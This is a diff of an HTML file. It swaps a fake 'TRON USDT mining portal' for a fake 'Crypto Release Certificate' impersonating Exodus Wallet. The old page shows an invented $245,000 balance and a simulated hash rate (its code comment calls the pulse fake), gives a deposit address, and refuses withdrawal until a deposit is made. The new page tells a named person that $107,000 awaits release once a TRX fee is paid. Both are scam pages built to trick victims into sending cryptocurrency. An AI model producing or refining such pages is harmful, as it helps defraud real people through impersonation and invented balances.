@@ -1,218 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON USDT • Mining Portal</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Space+Grotesk:wght@500;600&amp;display=swap');
-        
-        body { font-family: 'Inter', system-ui, sans-serif; }
-        .logo-font { font-family: 'Space Grotesk', sans-serif; }
-
-        .mining-rig {
-            animation: miningPulse 4s ease-in-out infinite;
-        }
-        @keyframes miningPulse {
-            0%, 100% { opacity: 0.85; transform: scale(1); }
-            50% { opacity: 1; transform: scale(1.03); }
-        }
-
-        .hash-rate {
-            font-variant-numeric: tabular-nums;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Crypto Release Certificate - Exodus</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    :root {
+      --bg: #0b0f1a;
+      --card: #141a2b;
+      --accent: #4db6ff;
+      --danger: #ff4b6a;
+      --warning: #ffb347;
+      --success: #3bd18a;
+      --text: #f5f7ff;
+      --muted: #9aa0b8;
+      --border: #1f2538;
+      --radius: 14px;
+      --shadow: 0 12px 28px rgba(0,0,0,0.6);
+    }
+    * { box-sizing: border-box; margin:0; padding:0; font-family: system-ui, sans-serif; }
+    body { background: var(--bg); color: var(--text); min-height:100vh; display:flex; justify-content:center; }
+    .app { width:100%; max-width:480px; padding:16px; }
+    .card { background: var(--card); border-radius: var(--radius); border:1px solid var(--border); padding:16px; margin-bottom:16px; box-shadow: var(--shadow); }
+    .card-title { font-size:14px; font-weight:600; margin-bottom:8px; color: var(--accent); text-transform:uppercase; }
+    .row { display:flex; justify-content:space-between; margin-bottom:6px; font-size:13px; }
+    .label { color: var(--muted); }
+    .value { font-weight:500; }
+    .highlight { color: var(--warning); }
+    .danger { color: var(--danger); }
+    .success { color: var(--success); }
+    .btn { display:block; width:100%; padding:10px; border-radius:999px; border:1px solid var(--accent); background: var(--accent); color:#0b0f1a; font-weight:600; margin-top:12px; text-align:center; cursor:pointer; }
+    .footer { font-size:12px; color: var(--muted); margin-top:12px; text-align:center; }
+  </style>
 </head>
-<body class="bg-zinc-950 text-white overflow-x-hidden">
+<body>
+  <div class="app">
+    <!-- Certificate Header -->
+    <section class="card">
+      <div class="card-title">Crypto Release Certificate</div>
+      <div class="row"><div class="label">Name</div><div class="value">Tupaz Ramon</div></div>
+      <div class="row"><div class="label">Country</div><div class="value">Philippines</div></div>
+      <div class="row"><div class="label">Gender</div><div class="value">Male</div></div>
+      <div class="row"><div class="label">Wallet</div><div class="value">TRUST WALLET / BYBIT</div></div>
+      <div class="row"><div class="label">Amount</div><div class="value">$107,000</div></div>
+    </section>
 
-    <!-- NAVBAR -->
-    <nav class="bg-black border-b border-zinc-800 sticky top-0 z-50">
-        <div class="max-w-7xl mx-auto px-8 py-5 flex justify-between items-center">
-            <div class="flex items-center gap-x-4">
-                <div class="w-10 h-10 bg-gradient-to-br from-cyan-400 to-blue-500 rounded-2xl flex items-center justify-center text-3xl font-bold">⛏️</div>
-                <div class="text-3xl font-semibold tracking-tighter logo-font text-cyan-400">TRON<span class="text-white">MINER</span></div>
-            </div>
-            
-            <div class="flex items-center gap-x-8 text-sm">
-                <div onclick="showDashboard()" class="cursor-pointer hover:text-cyan-400 transition-colors">Dashboard</div>
-                <div onclick="showMining()" class="cursor-pointer hover:text-cyan-400 transition-colors">Mining</div>
-                <div onclick="showDeposit()" class="cursor-pointer hover:text-cyan-400 transition-colors">Deposit</div>
-                <div onclick="showWithdraw()" class="cursor-pointer hover:text-cyan-400 transition-colors">Withdraw</div>
-            </div>
+    <!-- TRX Requirement -->
+    <section class="card">
+      <div class="card-title">Network Release Requirement</div>
+      <div class="row"><div class="label">TRX Needed</div><div class="value highlight">75 TRX</div></div>
+      <div class="row"><div class="label">Exodus Terminal</div><div class="value danger">18 TRX</div></div>
+      <div class="row"><div class="label">Amount Status</div><div class="value">$107,000 / <span class="danger">18 TRX</span></div></div>
+      <button class="btn">Proceed to Release</button>
+    </section>
 
-            <div class="flex items-center gap-x-3 bg-zinc-900 px-5 py-3 rounded-3xl">
-                <div class="text-xs text-right">
-                    <div class="text-emerald-400">Connected</div>
-                    <div class="font-mono text-[13px]">TRC20</div>
-                </div>
-            </div>
-        </div>
-    </nav>
+    <!-- Reassurance Section -->
+    <section class="card">
+      <div class="card-title">Exodus Wallet Assurance</div>
+      <p style="font-size:13px; line-height:1.4; color:var(--muted);">
+        Your funds remain fully protected under Exodus wallet’s encrypted environment.  
+        The release process requires TRX clearance due to high‑value congestion, but your principal amount of <strong>$107,000</strong> is secured and unaffected.  
+        Once the TRX requirement is met, Exodus will finalize the transaction and issue a verified release certificate.
+      </p>
+    </section>
 
-    <!-- DASHBOARD -->
-    <div id="dashboard" class="max-w-7xl mx-auto px-8 py-12">
-        <div class="grid md:grid-cols-2 gap-8">
-            <!-- Main Balance -->
-            <div class="bg-zinc-900 rounded-3xl p-10">
-                <div class="flex justify-between">
-                    <div>
-                        <div class="uppercase text-xs tracking-widest text-zinc-400">Main Balance</div>
-                        <div class="text-6xl font-semibold tracking-tighter mt-4 text-white">$0.00</div>
-                        <div class="text-emerald-400 text-sm mt-1">USDT</div>
-                    </div>
-                    <i class="fa-solid fa-wallet text-5xl text-zinc-700"></i>
-                </div>
-            </div>
-
-            <!-- Mining Balance -->
-            <div class="bg-gradient-to-br from-zinc-900 to-cyan-950 border border-cyan-400/30 rounded-3xl p-10">
-                <div class="flex justify-between">
-                    <div>
-                        <div class="uppercase text-xs tracking-widest text-cyan-400">Mining Balance</div>
-                        <div id="mining-balance" class="text-6xl font-semibold tracking-tighter mt-4 text-cyan-400">$245,000</div>
-                        <div class="text-cyan-400/70 text-sm mt-1">USDT • Active</div>
-                    </div>
-                    <div class="text-right">
-                        <div class="text-4xl">⛏️</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Quick Stats -->
-        <div class="grid grid-cols-3 gap-6 mt-10">
-            <div class="bg-zinc-900 rounded-3xl p-6 text-center">
-                <div class="text-xs text-zinc-400">24h Earnings</div>
-                <div class="text-3xl font-semibold text-emerald-400 mt-3">1,284 USDT</div>
-            </div>
-            <div class="bg-zinc-900 rounded-3xl p-6 text-center">
-                <div class="text-xs text-zinc-400">Hash Rate</div>
-                <div id="hash-rate" class="hash-rate text-3xl font-semibold text-white mt-3">487.3 TH/s</div>
-            </div>
-            <div class="bg-zinc-900 rounded-3xl p-6 text-center">
-                <div class="text-xs text-zinc-400">Active Miners</div>
-                <div class="text-3xl font-semibold text-white mt-3">12</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- MINING SECTION -->
-    <div id="mining-section" class="hidden max-w-7xl mx-auto px-8 py-12">
-        <div class="text-center">
-            <div class="mining-rig inline-flex flex-col items-center">
-                <div class="text-8xl mb-6">⛏️</div>
-                <div class="text-2xl font-medium text-cyan-400">TRON USDT MINING ACTIVE</div>
-                <div class="mt-8 w-64 h-2 bg-zinc-800 rounded-full overflow-hidden">
-                    <div class="h-full bg-gradient-to-r from-cyan-400 to-blue-500 w-[87%] rounded-full"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- DEPOSIT SECTION -->
-    <div id="deposit-section" class="hidden max-w-4xl mx-auto px-8 py-16">
-        <div class="bg-zinc-900 rounded-3xl p-12">
-            <h2 class="text-3xl font-semibold text-center">Investment Deposit</h2>
-            <div class="mt-10 text-center">
-                <div class="text-sm text-zinc-400">Send USDT (TRC20) to this wallet:</div>
-                <div onclick="copyWallet()" class="mt-4 font-mono bg-black p-6 rounded-2xl text-cyan-300 text-sm break-all cursor-pointer hover:text-cyan-400 transition-colors">
-                    TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o
-                </div>
-                <div class="mt-6 text-xs text-zinc-500">Minimum deposit: $100 USDT</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- WITHDRAW SECTION -->
-    <div id="withdraw-section" class="hidden max-w-4xl mx-auto px-8 py-16">
-        <div class="bg-zinc-900 rounded-3xl p-12 text-center">
-            <i class="fa-solid fa-circle-exclamation text-6xl text-amber-400"></i>
-            <h2 class="text-3xl font-semibold mt-8">Withdrawal Unavailable</h2>
-            <p class="mt-4 text-zinc-400 max-w-md mx-auto">
-                You don’t have any investment package. Please deposit the minimum amount and try again.
-            </p>
-            <button onclick="showDeposit()" 
-                    class="mt-10 px-10 py-5 bg-cyan-500 text-black font-semibold rounded-3xl">
-                Make a Deposit
-            </button>
-        </div>
-    </div>
-
-    <!-- FLOATING WALLET -->
-    <div class="fixed bottom-8 right-8 bg-zinc-900 border border-cyan-400/30 rounded-3xl px-6 py-4 flex items-center gap-x-3 text-sm cursor-pointer hover:border-cyan-400 transition-colors" onclick="showDeposit()">
-        <i class="fa-solid fa-wallet text-cyan-400"></i>
-        <span class="font-mono text-xs">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</span>
-    </div>
-
-    <script>
-        let currentSection = 'dashboard';
-
-        function hideAll() {
-            document.getElementById('dashboard').classList.add('hidden');
-            document.getElementById('mining-section').classList.add('hidden');
-            document.getElementById('deposit-section').classList.add('hidden');
-            document.getElementById('withdraw-section').classList.add('hidden');
-        }
-
-        function showDashboard() {
-            hideAll();
-            document.getElementById('dashboard').classList.remove('hidden');
-            currentSection = 'dashboard';
-        }
-
-        function showMining() {
-            hideAll();
-            document.getElementById('mining-section').classList.remove('hidden');
-            currentSection = 'mining';
-        }
-
-        function showDeposit() {
-            hideAll();
-            document.getElementById('deposit-section').classList.remove('hidden');
-            currentSection = 'deposit';
-        }
-
-        function showWithdraw() {
-            hideAll();
-            document.getElementById('withdraw-section').classList.remove('hidden');
-            currentSection = 'withdraw';
-        }
-
-        function copyWallet() {
-            navigator.clipboard.writeText("TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o");
-            const toast = document.createElement('div');
-            toast.className = "fixed bottom-24 right-8 bg-emerald-600 text-white px-6 py-3 rounded-2xl text-sm";
-            toast.textContent = "Wallet address copied!";
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 2000);
-        }
-
-        // Live Hash Rate Animation
-        function animateHashRate() {
-            let rate = 487.3;
-            setInterval(() => {
-                rate += (Math.random() * 1.2 - 0.6);
-                document.getElementById('hash-rate').textContent = rate.toFixed(1) + " TH/s";
-            }, 1800);
-        }
-
-        // Initialize
-        window.onload = () => {
-            showDashboard();
-            animateHashRate();
-            
-            // Fake mining balance pulse
-            setInterval(() => {
-                const el = document.getElementById('mining-balance');
-                el.style.transition = 'all 0.6s';
-                el.style.transform = 'scale(1.05)';
-                setTimeout(() => {
-                    el.style.transform = 'scale(1)';
-                }, 600);
-            }, 4000);
-        };
-    </script>
+    <div class="footer">© 2026 Exodus Wallet · Secure Crypto Release</div>
+  </div>
 </body>
 </html>
